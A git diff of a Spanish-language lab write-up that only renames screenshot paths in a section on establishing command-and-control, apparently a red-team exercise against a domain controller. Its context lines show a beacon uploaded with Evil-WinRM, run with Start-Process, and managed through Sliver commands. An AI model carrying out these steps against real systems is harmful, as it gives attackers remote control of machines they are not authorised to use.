@@ -54,7 +54,7 @@ generate beacon \
 ---
 
 ### 5.3 — Transferencia y ejecución
-> 📸 Captura: ![fase5-01](../../screenshots/FASE-5-C2-Establishment/fase5-01-beacon-upload-exec.png)
+> 📸 Captura: ![fase05-01](../../screenshots/FASE-05-C2-Establishment/fase05-01-beacon-upload-exec.png)
 
 ```powershell
 # Evil-WinRM — subir beacon
@@ -67,7 +67,7 @@ Start-Process -FilePath "C:\Users\Administrador.DC-01\Documents\beacon_dc01.exe"
 ---
 
 ### 5.4 — Beacon conectado
-> 📸 Captura: ![fase5-02](../../screenshots/FASE-5-C2-Establishment/fase5-02-sliver-beacon-dc01.png)
+> 📸 Captura: ![fase05-02](../../screenshots/FASE-05-C2-Establishment/fase05-02-sliver-beacon-dc01.png)
 
 ```
 [*] Beacon 4d1146b0 CLINICAL_CHAIRMAN - 10.0.2.10:62651 (DC-01) - windows/amd64
@@ -76,7 +76,7 @@ Start-Process -FilePath "C:\Users\Administrador.DC-01\Documents\beacon_dc01.exe"
 ---
 
 ### 5.5 — Los tres beacons activos simultáneamente
-> 📸 Captura: ![fase5-03](../../screenshots/FASE-5-C2-Establishment/fase5-03-sliver-all-beacons.png)
+> 📸 Captura: ![fase05-03](../../screenshots/FASE-05-C2-Establishment/fase05-03-sliver-all-beacons.png)
 
 ```
 beacons
@@ -95,7 +95,7 @@ beacons
 ---
 
 ### 5.6 — Verificación de sesión
-> 📸 Captura: ![fase5-04](../../screenshots/FASE-5-C2-Establishment/fase5-04-sliver-session-active.png)
+> 📸 Captura: ![fase05-04](../../screenshots/FASE-05-C2-Establishment/fase05-04-sliver-session-active.png)
 
 ```
 use 4d1146b0
